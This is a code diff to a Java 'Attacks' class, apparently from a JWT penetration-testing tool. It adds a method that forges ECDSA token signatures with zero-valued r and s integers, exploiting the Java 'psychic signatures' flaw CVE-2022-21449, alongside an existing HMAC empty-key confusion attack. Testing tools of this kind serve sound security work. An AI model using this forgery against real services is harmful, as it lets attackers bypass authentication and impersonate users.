@@ -50,7 +50,10 @@ import static com.nimbusds.jose.JWSAlgorithm.*;
  */
 public class Attacks {
     private static final Set<JWSAlgorithm> SYMMETRIC_ALGORITHMS = Set.of(HS256, HS384, HS512);
+    private static final Set<JWSAlgorithm> ECDSA_ALGORITHMS = Set.of(ES256, ES384, ES512);
     private static final byte[] EMPTY_KEY = new byte[64];
+    private static final byte ASN1_SEQUENCE_TYPE = 0x30;
+    private static final byte ASN1_INTEGER_TYPE = 0x2;
 
     /**
      * Perform a HMAC key confusion attack
@@ -115,6 +118,32 @@ public class Attacks {
         Key key = new JWKKey(new OctetSequenceKey.Builder(EMPTY_KEY).build());
 
         return JWSFactory.sign(key, headerBase64, jws.getEncodedPayload(), signingInfo);
+    }
+
+    //  CVE-2022-21449 => https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
+    public static JWS signWithPsychicSignature(JWS jws, JWSAlgorithm algorithm) throws ParseException {
+        if (!ECDSA_ALGORITHMS.contains(algorithm)) {
+            throw new IllegalArgumentException("Invalid algorithm %s. Can only use NIST elliptic curve algorithms.".formatted(algorithm));
+        }
+
+        Map<String, Object> headerJsonMap = JSONObjectUtils.parse(jws.getHeader());
+        headerJsonMap.put(ALGORITHM, algorithm.getName());
+        Base64URL headerBase64 = JWSHeader.parse(headerJsonMap).toBase64URL();
+
+        int zeroBytesLength = 1; // DER encoding cannot have leading zeros to pad signature to expected length and this is enforced
+        int signatureLength = 6 + (2 * zeroBytesLength);
+        byte[] signature = new byte[signatureLength];
+
+        signature[0] = ASN1_SEQUENCE_TYPE;
+        signature[1] = (byte) (signatureLength - 2);
+        signature[2] = ASN1_INTEGER_TYPE;
+        signature[3] = (byte) zeroBytesLength;
+        signature[4 + zeroBytesLength] = ASN1_INTEGER_TYPE;
+        signature[5 + zeroBytesLength] = (byte) zeroBytesLength;
+
+        Base64URL encodedSignature = Base64URL.encode(signature);
+
+        return JWSFactory.jwsFromParts(headerBase64, jws.getEncodedPayload(), encodedSignature);
     }
 
     /**
